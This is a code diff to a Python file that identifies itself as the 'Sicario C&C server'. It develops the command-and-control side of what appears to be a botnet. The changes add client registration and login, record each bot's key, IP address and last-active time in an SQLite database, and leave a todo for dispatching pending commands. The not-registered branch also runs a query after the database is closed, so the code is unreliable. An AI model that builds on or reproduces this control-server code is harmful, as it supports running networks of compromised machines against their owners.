@@ -3,7 +3,7 @@
 import sicario 
 import commands
 import log
-import database as db
+import database
 
 # Sicario C&C server
 # High level client class
@@ -23,9 +23,11 @@ class Client:
 		# arguments[0] is the command name
 		arguments = commands.parse(command)
 		
-		if self.registered == False and arguments[0] != 'register':
+		if self.registered == False and arguments[0] != 'register' and arguments[0] != 'login':
 			self.disconnect()
 			return False
+
+		db = database.Database({'filename':'db/sicario.db'})
 		
 		# is it new member? let's check if he provided his key
 		if len(arguments) < 2:
@@ -36,8 +38,37 @@ class Client:
 			self.send_command(['set','key',key])
 			
 			# now, we should add this to a database
-			database = sicario.Sicario.get_database().handler
-			print database.execute('SELECT * FROM `sqlite_master` WHERE `type` = \'table\'')
+			db.cursor.execute('''INSERT INTO clients (hash, ip, last_active) VALUES (?,?,datetime('now', 'localtime'))''', [key, self.address])
+			db.handler.commit()
+			db.handler.close()
+
+			# client registered himself, so its time to disconnect him.
+			self.disconnect()
+
+		elif len(arguments) == 2 and len(arguments[1]) == 32:
+			# already registered member
+			key = arguments[1]
+
+			# first we check if our client is registered in the database, if not - we inform him about it
+			db.cursor.execute('SELECT * FROM clients WHERE hash=?', [key])
+			client = db.cursor.fetchone()
+
+			if not client:
+				self.send_command(['error', '1'])
+				db.handler.close()
+				self.disconnect()
+
+			db.cursor.execute('''UPDATE clients SET last_active = datetime('now', 'localtime'), ip = ? WHERE hash=?''', [self.address, key])
+
+			log.log('{} (key {}) updated himself successfully.'.format(self.address, key))
+
+			# todo: check for pending commands
+			db.handler.commit()
+			db.handler.close()
+
+			self.disconnect()
+
+
 	
 	def send_command (self, args):
 		self.raw_send(commands.encode(args))
@@ -46,4 +77,5 @@ class Client:
 		self.socket.send(text)
 		
 	def disconnect (self): # why bother? he will disconnect automatically in 10 seconds
+		self.socket.stop()
 		return True
